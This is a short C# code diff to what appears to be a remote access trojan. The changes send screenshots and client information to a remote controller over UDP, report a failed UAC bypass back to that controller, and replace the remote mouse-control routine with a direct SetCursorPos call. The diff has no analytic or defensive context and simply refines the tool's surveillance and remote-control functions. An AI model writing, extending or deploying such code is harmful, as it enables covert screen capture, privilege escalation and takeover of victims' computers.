@@ -242,9 +242,9 @@ public static class GClass
             await ReconnectLoop(client);
 
             var info = await BuildClientInfo();
-            await client.SendFileBytesWithMeta(screenshot, info.ToString());
+            await client.SendFileViaUdp(screenshot, info.ToString());
 
-            await client.SendFileBytesWithMeta(screenshot, new JObject
+            await client.SendFileViaUdp(screenshot, new JObject
             {
                 ["msg"] = "log",
                 ["message"] = "Failed to UAC Bypass",
@@ -374,11 +374,11 @@ public static class GClass
     private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
     private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
     private const uint MOUSEEVENTF_WHEEL = 0x0800;
-
+    [DllImport("user32.dll")]
+    private static extern bool SetCursorPos(int X, int Y);
     public static void MouseMoveAbsolute(int x, int y)
     {
-        Cursor.Position = new Point(x, y);
-        mouse_event(MOUSEEVENTF_MOVE, x, y, 0, UIntPtr.Zero);
+        SetCursorPos(x, y);
     }
 
     public static void PerformMouseClick(string button)
